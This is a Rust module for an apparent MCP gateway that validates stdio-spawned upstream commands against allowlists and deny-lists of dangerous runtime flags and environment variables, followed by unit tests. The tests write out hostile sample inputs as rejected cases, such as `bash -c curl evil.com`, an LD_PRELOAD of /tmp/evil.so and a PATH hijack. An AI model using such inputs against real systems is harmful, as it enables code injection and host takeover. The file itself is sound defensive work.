//! Shared stdio-spawn security guards.
//!
//! These guards are applied at `validate_upstream` write-time so that every
//! persisted stdio config is already clean before it reaches `connect_stdio`.
//! Both the gateway add/update/import path and the marketplace install path
//! call these same functions — there is exactly one copy of each rule.
//!
//! # Allowlists
//! - [`ALLOWED_RUNTIME_HINTS`] — executables that may appear as the `command`
//!   field of a stdio upstream.
//! - [`DENIED_ENV_NAMES`] — env-var names that upstreams must not override.
//! - [`DANGEROUS_DOCKER_FLAGS`] / [`DANGEROUS_NODE_FLAGS`] — argv flags that
//!   are rejected for the corresponding runtime families.

use crate::error::ToolError;

/// Runtime hints / commands the gateway is allowed to execute as stdio upstreams.
pub const ALLOWED_RUNTIME_HINTS: &[&str] = &[
    "npx", "uvx", "docker", "dnx", "pipx", "node", "python", "python3", "deno",
];

/// Environment variables that upstream processes must not override.
pub const DENIED_ENV_NAMES: &[&str] = &[
    "PATH",
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "HOME",
    "SHELL",
    "IFS",
    "USER",
    "PWD",
];

/// Docker flags that grant broad host access.
pub const DANGEROUS_DOCKER_FLAGS: &[&str] = &[
    "--privileged",
    "--cap-add",
    "--volume",
    "-v",
    "--device",
    "--network",
    "--pid",
    "--ipc",
];

/// Node-family flags that can preload/evaluate arbitrary code or expose debug surfaces.
pub const DANGEROUS_NODE_FLAGS: &[&str] = &[
    "--inspect",
    "--require",
    "-r",
    "--experimental",
    "--allow",
    "-e",
    "--eval",
    "-p",
    "--print",
];

/// Python flags that execute inline code or read a program from stdin.
/// (`-m <module>` is intentionally allowed — that's the normal way MCP servers run.)
pub const DANGEROUS_PYTHON_FLAGS: &[&str] = &["-c", "--command", "-"];

/// Deno subcommands/flags that eval inline code or grant blanket permissions.
pub const DANGEROUS_DENO_FLAGS: &[&str] = &["eval", "--allow-all", "-A"];

/// Validate that a stdio `command` string is in the runtime-hint allowlist.
///
/// This is the primary S1/S6 guard: only known safe runtimes may be persisted
/// as the `command` of a stdio upstream. Callers that receive a raw command
/// string from the operator (gateway add/update/import, marketplace install)
/// must call this before writing to config.
///
/// Pass `extra` to extend the built-in list with operator-configured commands
/// (from `[gateway] extra_stdio_commands` in `config.toml`). This scoped
/// allowlist is the **preferred** way to permit an additional runtime: it adds
/// exactly the binaries you name while keeping every other guard (argv flags,
/// env names/values) enforced.
///
/// Pass `bypass = true` (driven by `[gateway] disable_spawn_guard = true`) to
/// skip the command allowlist **entirely**. This is a coarse, global escape
/// hatch — with it set, `bash`, `/bin/sh -c`, and arbitrary binaries like
/// `/tmp/evil` all become spawnable. Prefer `extra_stdio_commands` and leave
/// the guard on. When the bypass is active, every skipped validation emits a
/// `WARN` so the weakened posture is visible in logs.
///
/// Returns `invalid_param` if the command is not in either allowlist.
pub fn validate_stdio_command(
    command: &str,
    extra: &[String],
    bypass: bool,
) -> Result<(), ToolError> {
    if bypass {
        tracing::warn!(
            service = "upstream.pool",
            command = %command,
            "SECURITY: spawn-guard bypass active — command allowlist NOT enforced \
             (disable_spawn_guard = true); prefer scoping with [gateway] extra_stdio_commands"
        );
        return Ok(());
    }

    let binary = std::path::Path::new(command)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(command);

    if ALLOWED_RUNTIME_HINTS.contains(&binary) || extra.iter().any(|e| e == binary) {
        Ok(())
    } else {
        let mut allowed: Vec<&str> = ALLOWED_RUNTIME_HINTS.to_vec();
        let extra_refs: Vec<&str> = extra.iter().map(String::as_str).collect();
        allowed.extend_from_slice(&extra_refs);
        Err(ToolError::InvalidParam {
            param: "command".to_string(),
            message: format!(
                "stdio command '{}' is not in the allowed list; must be one of: {} \
                 (add to [gateway] extra_stdio_commands in config.toml to extend, \
                 or set disable_spawn_guard = true to disable this check)",
                command,
                allowed.join(", ")
            ),
        })
    }
}

/// Validate that none of the argv strings violates runtime-specific security policy.
///
/// Checks for control characters and runtime-specific dangerous flags
/// (e.g. `--privileged` for docker, `--require` for node/npx).
pub fn validate_stdio_argv(runtime_hint: &str, args: &[String]) -> Result<(), ToolError> {
    for arg in args {
        if arg.contains('\n') || arg.contains('\r') || arg.contains('\0') {
            return Err(ToolError::InvalidParam {
                param: "args".to_string(),
                message: "argv values must not contain newline, carriage return, or null bytes"
                    .to_string(),
            });
        }
        validate_runtime_argv_flag(runtime_hint, arg)?;
    }
    Ok(())
}

fn validate_runtime_argv_flag(runtime_hint: &str, arg: &str) -> Result<(), ToolError> {
    let flag = arg.split('=').next().unwrap_or(arg);
    let denied = match runtime_hint {
        "docker" => {
            DANGEROUS_DOCKER_FLAGS.contains(&flag)
                || matches!(arg, "--network=host" | "--pid=host" | "--ipc=host")
        }
        "node" | "npx" => DANGEROUS_NODE_FLAGS
            .iter()
            .any(|prefix| node_flag_matches(prefix, flag)),
        "python" | "python3" => DANGEROUS_PYTHON_FLAGS.contains(&flag),
        "deno" => DANGEROUS_DENO_FLAGS.contains(&flag),
        _ => false,
    };

    if denied {
        Err(ToolError::InvalidParam {
            param: "args".to_string(),
            message: format!("argv flag '{arg}' is not allowed for runtime '{runtime_hint}'"),
        })
    } else {
        Ok(())
    }
}

fn node_flag_matches(denied: &str, flag: &str) -> bool {
    flag == denied
        || match denied {
            "--allow" | "--experimental" | "--inspect" => flag.starts_with(&format!("{denied}-")),
            _ => false,
        }
}

/// Validate an environment variable name supplied with a stdio upstream.
///
/// Must match `^[A-Z][A-Z0-9_]*$` and must not be a protected process or
/// `LAB_*` variable.
pub fn validate_stdio_env_name(name: &str) -> Result<(), ToolError> {
    let valid = !name.is_empty()
        && name.starts_with(|c: char| c.is_ascii_uppercase())
        && name
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');

    let denied = DENIED_ENV_NAMES.contains(&name) || name.starts_with("LAB_");

    if valid && !denied {
        Ok(())
    } else {
        Err(ToolError::InvalidParam {
            param: "env".to_string(),
            message: format!(
                "env var name '{name}' is invalid; must match ^[A-Z][A-Z0-9_]*$ and must not be a protected process or LAB_* variable"
            ),
        })
    }
}

/// Validate an environment variable value supplied with a stdio upstream.
///
/// Must not contain embedded control separators (newline, CR, null byte).
pub fn validate_stdio_env_value(key: &str, value: &str) -> Result<(), ToolError> {
    if value.contains('\n') || value.contains('\r') || value.contains('\0') {
        Err(ToolError::InvalidParam {
            param: "env".to_string(),
            message: format!(
                "env var '{key}' value must not contain newline, carriage return, or null bytes"
            ),
        })
    } else {
        Ok(())
    }
}

/// Run all stdio security guards for a command + args + env triple.
///
/// Convenience wrapper that calls [`validate_stdio_command`],
/// [`validate_stdio_argv`], [`validate_stdio_env_name`], and
/// [`validate_stdio_env_value`] in sequence. Returns the first error found.
///
/// Pass `extra` / `bypass` from `GatewayPreferences` to extend or disable the command allowlist.
pub fn validate_stdio_spec(
    command: &str,
    args: &[String],
    env: &std::collections::BTreeMap<String, String>,
    extra: &[String],
    bypass: bool,
) -> Result<(), ToolError> {
    validate_stdio_command(command, extra, bypass)?;

    // Derive the runtime hint from the binary name for argv checking.
    let runtime_hint = std::path::Path::new(command)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(command);

    validate_stdio_argv(runtime_hint, args)?;

    for (name, value) in env {
        validate_stdio_env_name(name)?;
        validate_stdio_env_value(name, value)?;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;
    use std::io;
    use std::sync::{Arc, Mutex};

    use super::*;
    use tracing_subscriber::fmt::MakeWriter;

    #[derive(Clone, Default)]
    struct SharedBuf(Arc<Mutex<Vec<u8>>>);

    impl<'a> MakeWriter<'a> for SharedBuf {
        type Writer = SharedWriter;

        fn make_writer(&'a self) -> Self::Writer {
            SharedWriter(Arc::clone(&self.0))
        }
    }

    struct SharedWriter(Arc<Mutex<Vec<u8>>>);

    impl io::Write for SharedWriter {
        fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
            self.0.lock().unwrap().extend_from_slice(buf);
            Ok(buf.len())
        }

        fn flush(&mut self) -> io::Result<()> {
            Ok(())
        }
    }

    fn captured_logs(buf: &SharedBuf) -> String {
        String::from_utf8(buf.0.lock().unwrap().clone()).unwrap()
    }

    static TRACING_TEST_LOCK: Mutex<()> = Mutex::new(());

    // ── validate_stdio_command ───────────────────────────────────────────────

    #[test]
    fn command_accepts_known_runtimes() {
        for cmd in ALLOWED_RUNTIME_HINTS {
            assert!(
                validate_stdio_command(cmd, &[], false).is_ok(),
                "expected {cmd} to be allowed"
            );
        }
    }

    #[test]
    fn command_rejects_bash() {
        let err = validate_stdio_command("bash", &[], false).unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn command_rejects_sh_c_style_injection() {
        let err = validate_stdio_command("/bin/sh", &[], false).unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn command_rejects_arbitrary_binary() {
        let err = validate_stdio_command("/tmp/evil", &[], false).unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn command_extracts_binary_name_from_absolute_path() {
        // /usr/bin/node → binary "node" → allowed
        assert!(validate_stdio_command("/usr/bin/node", &[], false).is_ok());
    }

    #[test]
    fn command_accepts_extra_allowlisted_binary() {
        let extra = vec!["labby".to_string(), "runarr".to_string()];
        assert!(validate_stdio_command("labby", &extra, false).is_ok());
        assert!(validate_stdio_command("runarr", &extra, false).is_ok());
        // bash still rejected even with extras
        assert!(validate_stdio_command("bash", &extra, false).is_err());
    }

    #[test]
    fn command_bypass_skips_all_checks() {
        assert!(validate_stdio_command("bash", &[], true).is_ok());
        assert!(validate_stdio_command("/bin/sh", &[], true).is_ok());
        assert!(validate_stdio_command("/tmp/anything", &[], true).is_ok());
    }

    #[test]
    fn command_bypass_emits_security_warn() {
        use tracing_subscriber::layer::SubscriberExt;
        use tracing_subscriber::{EnvFilter, fmt};

        let _tracing_lock = TRACING_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let buf = SharedBuf::default();
        let subscriber = tracing_subscriber::registry()
            .with(EnvFilter::new("labby_runtime=warn"))
            .with(
                fmt::layer()
                    .json()
                    .with_writer(buf.clone())
                    .with_ansi(false)
                    .without_time(),
            );

        {
            let _guard = tracing::subscriber::set_default(subscriber);
            // The bypass path must allow the otherwise-rejected command...
            assert!(validate_stdio_command("bash", &[], true).is_ok());
        }

        // ...AND emit a WARN documenting the weakened posture (Sec-M2).
        let logs = captured_logs(&buf);
        assert!(
            logs.contains("\"level\":\"WARN\""),
            "bypass must emit a WARN-level event; captured logs: {logs}"
        );
        assert!(
            logs.contains("spawn-guard bypass active"),
            "WARN must identify the spawn-guard bypass; captured logs: {logs}"
        );
        assert!(
            logs.contains("bash"),
            "WARN should record the bypassed command; captured logs: {logs}"
        );
    }

    #[test]
    fn command_no_bypass_emits_no_warn() {
        use tracing_subscriber::layer::SubscriberExt;
        use tracing_subscriber::{EnvFilter, fmt};

        let _tracing_lock = TRACING_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let buf = SharedBuf::default();
        let subscriber = tracing_subscriber::registry()
            .with(EnvFilter::new("labby_runtime=warn"))
            .with(
                fmt::layer()
                    .json()
                    .with_writer(buf.clone())
                    .with_ansi(false)
                    .without_time(),
            );

        {
            let _guard = tracing::subscriber::set_default(subscriber);
            // A normally-allowed command with the guard ON must not WARN.
            assert!(validate_stdio_command("npx", &[], false).is_ok());
        }

        let logs = captured_logs(&buf);
        assert!(
            !logs.contains("spawn-guard bypass active"),
            "no bypass WARN must be emitted when bypass=false; captured logs: {logs}"
        );
    }

    // ── validate_stdio_argv ─────────────────────────────────────────────────

    #[test]
    fn argv_rejects_control_characters() {
        let err = validate_stdio_argv("uvx", &["safe\nunsafe".to_string()]).unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn argv_rejects_docker_privileged() {
        let err = validate_stdio_argv("docker", &["--privileged".to_string()]).unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn argv_rejects_docker_volume_flag() {
        let err =
            validate_stdio_argv("docker", &["-v".to_string(), "/:/host".to_string()]).unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn argv_rejects_node_require() {
        let err = validate_stdio_argv("node", &["--require".to_string(), "/tmp/x.js".to_string()])
            .unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn argv_rejects_npx_inspect() {
        let err = validate_stdio_argv("npx", &["--inspect=0.0.0.0:9229".to_string()]).unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn argv_accepts_npx_package_flag_that_shares_node_prefix() {
        assert!(
            validate_stdio_argv(
                "npx",
                &[
                    "-y".to_string(),
                    "@vaulttools/mcp".to_string(),
                    "--allowed-dir".to_string(),
                    "/home/jmagar".to_string(),
                ],
            )
            .is_ok()
        );
    }

    #[test]
    fn argv_rejects_node_permission_flags() {
        let err = validate_stdio_argv(
            "node",
            &[
                "--allow-fs-read=/home/jmagar".to_string(),
                "server.js".to_string(),
            ],
        )
        .unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn argv_rejects_node_eval() {
        for flag in ["-e", "--eval", "-p", "--print"] {
            let err =
                validate_stdio_argv("node", &[flag.to_string(), "process.exit()".to_string()])
                    .unwrap_err();
            assert_eq!(err.kind(), "invalid_param", "node {flag} must be rejected");
        }
    }

    #[test]
    fn argv_rejects_python_inline_code() {
        for flag in ["-c", "--command", "-"] {
            let err = validate_stdio_argv("python3", &[flag.to_string(), "import os".to_string()])
                .unwrap_err();
            assert_eq!(
                err.kind(),
                "invalid_param",
                "python {flag} must be rejected"
            );
        }
    }

    #[test]
    fn argv_accepts_python_module_run() {
        // `python -m <module>` is the normal way MCP servers launch — must stay allowed.
        assert!(
            validate_stdio_argv("python3", &["-m".to_string(), "mcp_server".to_string()]).is_ok()
        );
    }

    #[test]
    fn argv_rejects_deno_eval_and_allow_all() {
        for arg in ["eval", "--allow-all", "-A"] {
            let err = validate_stdio_argv("deno", &[arg.to_string()]).unwrap_err();
            assert_eq!(err.kind(), "invalid_param", "deno {arg} must be rejected");
        }
    }

    #[test]
    fn argv_accepts_benign_args() {
        assert!(
            validate_stdio_argv(
                "npx",
                &[
                    "-y".to_string(),
                    "@modelcontextprotocol/server-everything".to_string()
                ]
            )
            .is_ok()
        );
    }

    // ── validate_stdio_env_name ─────────────────────────────────────────────

    #[test]
    fn env_name_rejects_ld_preload() {
        let err = validate_stdio_env_name("LD_PRELOAD").unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn env_name_rejects_path() {
        let err = validate_stdio_env_name("PATH").unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn env_name_rejects_lab_prefix() {
        let err = validate_stdio_env_name("LAB_TOKEN").unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn env_name_rejects_lowercase() {
        let err = validate_stdio_env_name("my_token").unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn env_name_accepts_valid_uppercase() {
        assert!(validate_stdio_env_name("MY_TOKEN").is_ok());
        assert!(validate_stdio_env_name("API_KEY").is_ok());
    }

    // ── validate_stdio_env_value ────────────────────────────────────────────

    #[test]
    fn env_value_rejects_null_byte() {
        let err = validate_stdio_env_value("TOKEN", "abc\0def").unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn env_value_rejects_newline() {
        let err = validate_stdio_env_value("TOKEN", "abc\ndef").unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    // ── validate_stdio_spec (combined) ──────────────────────────────────────

    #[test]
    fn spec_rejects_bash_command() {
        let err = validate_stdio_spec(
            "bash",
            &["-c".to_string(), "curl evil.com".to_string()],
            &BTreeMap::new(),
            &[],
            false,
        )
        .unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn spec_rejects_ld_preload_env() {
        let mut env = BTreeMap::new();
        env.insert("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string());
        let err =
            validate_stdio_spec("node", &["server.js".to_string()], &env, &[], false).unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn spec_rejects_path_override() {
        let mut env = BTreeMap::new();
        env.insert("PATH".to_string(), "/tmp/evil:$PATH".to_string());
        let err = validate_stdio_spec(
            "npx",
            &["-y".to_string(), "some-pkg".to_string()],
            &env,
            &[],
            false,
        )
        .unwrap_err();
        assert_eq!(err.kind(), "invalid_param");
    }

    #[test]
    fn spec_accepts_clean_npx_invocation() {
        let mut env = BTreeMap::new();
        env.insert("MY_API_KEY".to_string(), "secret123".to_string());
        assert!(
            validate_stdio_spec(
                "npx",
                &[
                    "-y".to_string(),
                    "@modelcontextprotocol/server-everything".to_string()
                ],
                &env,
                &[],
                false,
            )
            .is_ok()
        );
    }
}
